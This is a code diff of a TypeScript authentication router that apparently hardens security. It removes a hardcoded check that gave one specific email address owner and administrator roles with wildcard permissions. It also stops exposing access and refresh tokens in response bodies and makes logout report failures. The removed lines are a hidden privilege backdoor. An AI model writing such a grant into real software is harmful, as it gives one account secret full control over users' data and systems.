@@ -222,16 +222,6 @@ export class AuthRouter {
           }
         }
 
-        const isOwnerEmail = primaryEmail.trim().toLowerCase() === 'wegdangamil2022@gmail.com';
-        if (isOwnerEmail) {
-          if (!roles.includes('owner')) roles.push('owner');
-          if (!roles.includes('administrator')) roles.push('administrator');
-          if (!roleNames.includes('Owner')) roleNames.push('Owner');
-          if (!roleNames.includes('Administrator')) roleNames.push('Administrator');
-          effectivePermissions.add('*');
-          effectivePermissions.add('admin:*');
-        }
-
         res.status(200).json(responseFormatter.success({
           principalId,
           displayName,
@@ -306,8 +296,6 @@ export class AuthRouter {
         setAuthCookies(res, tokens, !!rememberMe);
         res.status(200).json(responseFormatter.success({
           authenticated: true,
-          accessToken: tokens.accessToken,
-          refreshToken: tokens.refreshToken,
         }));
       } catch (error: any) {
         res.status(500).json(responseFormatter.error({
@@ -330,8 +318,6 @@ export class AuthRouter {
         setAuthCookies(res, tokens, rememberMe);
         res.status(200).json(responseFormatter.success({
           authenticated: true,
-          accessToken: tokens.accessToken,
-          refreshToken: tokens.refreshToken,
         }));
       } catch {
         clearAuthCookies(res);
@@ -344,20 +330,23 @@ export class AuthRouter {
 
     // 3. POST /logout
     router.post('/logout', async (req: Request, res: Response) => {
+      let failed = false;
       try {
         const refreshToken = readRefreshCookie(req) || req.body?.refreshToken;
         if (refreshToken && authService) {
           try {
             await authService.logoutCurrentSession(refreshToken);
           } catch {
-            // Ignore already invalidated or expired sessions on logout
+            failed = true;
           }
         }
       } finally {
         clearAuthCookies(res);
-        res.status(200).json(responseFormatter.success({
-          message: 'Successfully logged out'
-        }));
+      }
+      if (failed) {
+        res.status(401).json(responseFormatter.error({ code: 'LOGOUT_FAILED', message: 'Session logout could not be confirmed' }));
+      } else {
+        res.status(200).json(responseFormatter.success({ message: 'Successfully logged out' }));
       }
     });
 
